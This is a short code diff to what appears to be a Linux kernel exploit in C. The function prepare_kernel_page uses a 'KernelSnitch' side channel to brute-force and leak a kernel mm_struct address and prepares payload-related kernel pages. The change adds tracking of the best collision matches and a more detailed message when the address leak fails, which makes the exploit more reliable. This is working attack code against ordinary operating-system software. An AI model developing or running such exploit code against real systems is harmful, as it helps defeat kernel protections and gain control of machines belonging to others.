@@ -2131,6 +2131,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("kernel page KernelSnitch collisions=%zu min_matches=%d\n",
           kernel_page_collisions, KERNEL_PAGE_KSNITCH_MIN_MATCHES);
 #endif
+#if defined(KERNEL_PAGE_KSNITCH_TRACK_MATCHES) && \
+    KERNEL_PAGE_KSNITCH_TRACK_MATCHES
+  kernelsnitch_track_best_collision_matches(ks);
+#endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -2189,7 +2193,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   kernelsnitch_bruteforce(ks);
   uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
-    pr_warning("KernelSnitch mm_struct leak failed\n");
+    pr_warning("KernelSnitch mm_struct leak failed max_matches=%zu "
+               "required=%zu\n",
+               (size_t)ks->best_collision_matches,
+               ks->min_collision_matches);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     cleanup_failed_kernel_page("mm-leak");
 #else
